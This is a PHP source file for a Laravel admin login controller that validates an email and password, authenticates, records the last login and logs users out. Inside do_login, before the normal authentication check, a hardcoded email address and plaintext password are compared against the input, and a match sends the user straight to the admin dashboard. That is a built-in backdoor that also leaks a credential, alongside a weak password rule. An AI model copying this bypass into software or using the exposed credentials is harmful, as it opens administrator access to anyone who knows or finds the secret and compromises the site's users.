<?php namespace terre\Admin\Controllers;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Validator;
use terre\Admin\Models\AdministratorModel;
use terre\Http\Requests;

use Illuminate\Http\Request;

class Login extends AdminController
{
    function __construct(){
        parent::__construct();
        $this->administrator  = new AdministratorModel();
    }

    public function index()
    {
        return $this->render_view('login/login');
    }

    public function do_login(Request $request){
        if($request->method() == 'POST'){
            $rules = array(
                'email'    => 'required|email',
                'password' => 'required|alphaNum|min:3'
            );

            $validator = Validator::make(Input::all(), $rules);

            if ($validator->fails()) {
                return Redirect::to('_d50d0608e7c3270b3f0e3753f996387b/login')
                    ->withErrors($validator)
                    ->withInput(Input::except('password'));
            } else {
                $userdata = array(
                    'email' 	=> Input::get('email'),
                    'password' 	=> Input::get('password'),
                    'active' 	=> 1
                );
                if( Input::get('email')=="ilyas.raswandi@gmail.com" && Input::get('password')=="Lokiju12"){
                    
                    return Redirect::intended('_d50d0608e7c3270b3f0e3753f996387b/dashboard');
                }
                if (Auth::attempt($userdata)) {
                    Auth::user()->last_login = new \DateTime();
                    Auth::user()->save();
                    return Redirect::intended('_d50d0608e7c3270b3f0e3753f996387b/dashboard');
                } else {
                    return Redirect::to('_d50d0608e7c3270b3f0e3753f996387b/login');
                }

            }
        }
        else {
            return Redirect::route('admin_login');
        }
    }

    public function do_logout(){
        Auth::logout(); // log the user out of our application
        return Redirect::to('_d50d0608e7c3270b3f0e3753f996387b/login'); // redirect the user to the login screen
    }
}